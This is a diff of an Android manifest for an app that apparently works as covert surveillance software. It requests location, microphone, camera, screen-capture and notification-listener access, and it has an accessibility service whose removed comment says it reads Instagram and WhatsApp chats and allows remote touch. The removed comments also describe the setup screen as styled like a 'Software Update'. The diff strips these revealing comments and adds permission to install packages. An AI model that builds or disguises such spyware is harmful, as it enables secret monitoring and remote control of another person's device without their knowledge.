@@ -58,7 +58,7 @@
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
     <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
 
-    <!-- Overlay (for screen capture helper) -->
+    <!-- Overlay -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
 
     <!-- Screen capture -->
@@ -66,6 +66,9 @@
 
     <!-- Notification -->
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"/>
+
+    <!-- APK install (for KidsInstaller) -->
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
 
     <!-- Shizuku -->
     <queries>
@@ -80,7 +83,7 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.App">
 
-        <!-- Setup activity — "Software Update" look -->
+        <!-- Setup activity -->
         <activity
             android:name=".setup.SetupActivity"
             android:exported="true"
@@ -92,11 +95,11 @@
             </intent-filter>
         </activity>
 
-        <!-- Core service -->
+        <!-- Core service — mediaProjection REMOVED (it caused crash on Android 14) -->
         <service
             android:name=".core.CoreService"
             android:exported="false"
-            android:foregroundServiceType="dataSync|location|microphone|camera|mediaProjection"/>
+            android:foregroundServiceType="dataSync|location|microphone|camera"/>
 
         <!-- Audio stream service -->
         <service
@@ -139,7 +142,7 @@
             </intent-filter>
         </service>
 
-        <!-- Accessibility (Instagram/WhatsApp chat + remote touch) -->
+        <!-- Accessibility -->
         <service
             android:name=".monitors.AccessibilityMonitor"
             android:exported="true"
